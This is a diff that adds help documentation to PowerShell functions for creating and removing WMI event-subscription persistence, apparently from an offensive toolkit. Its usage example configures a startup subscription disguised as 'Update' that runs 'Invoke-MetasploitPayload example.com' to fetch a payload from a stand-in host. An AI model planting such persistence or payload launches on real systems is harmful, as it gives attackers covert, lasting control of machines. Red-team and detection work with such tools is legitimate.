@@ -1,4 +1,44 @@
 function New-WMIPersistence {
+    <#
+      .SYNOPSIS 
+      Creates persistence through WMI event subscriptions
+
+      Author: Jared Haight (@jaredhaight)
+      License: MIT License
+      Required Dependencies: None
+      Optional Dependencies: None
+
+      .DESCRIPTION 
+      This script allows you to specify arbitrary commands to be executed on system startup or on user login
+
+      .PARAMETER Name
+      The name to be used for the WMI Filter, Consumer and Binding
+      
+      .PARAMETER Commmad
+      The command to run
+
+      .PARAMETER Arguments
+      The arguments to pass to the command when it's run.
+
+      .PARAMETER OnStartup 
+      Run the WMI event on Startup
+      
+      .PARAMETER OnLogin
+      Run the WMI event on Login (Can't be used with OnStartup)
+
+      .EXAMPLE 
+      PS C:\> New-WMIPersistence -Name Update -OnStartup -Command "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Arguments "-Command Invoke-MetasploitPayload example.com"
+
+      Description
+      -----------
+      Create a WMI subscription that runs Invoke-MetasploitPayload when the computer starts.
+
+      .LINK 
+      Script source can be found at https://github.com/jaredhaight/PowerPunch/blob/master/Persistence/New-WMIPersistence.ps1
+    
+    #>
+
+
     [cmdletbinding()]
     Param(
         [Parameter(Mandatory=$True)]
@@ -46,6 +86,28 @@ function New-WMIPersistence {
 }
 
 Function Remove-WMIPersistence {
+    <#
+      .SYNOPSIS 
+      Removes persistence created through New-WMIPersistence
+
+      Author: Jared Haight (@jaredhaight)
+      License: MIT License
+      Required Dependencies: None
+      Optional Dependencies: None
+
+      .DESCRIPTION 
+      This script removes the Filter, Consumer and Binding created by New-WMIPersistence
+
+      .PARAMETER Name
+      The name to used for when New-WMIPersistence was run
+
+      .EXAMPLE 
+      PS C:\> Remove-WMIPersistence -Name Update 
+
+      .LINK 
+      Script source can be found at https://github.com/jaredhaight/PowerPunch/blob/master/Persistence/New-WMIPersistence.ps1
+    
+    #>
     [cmdletbinding()]
     Param(
         [Parameter(Mandatory=$True)]
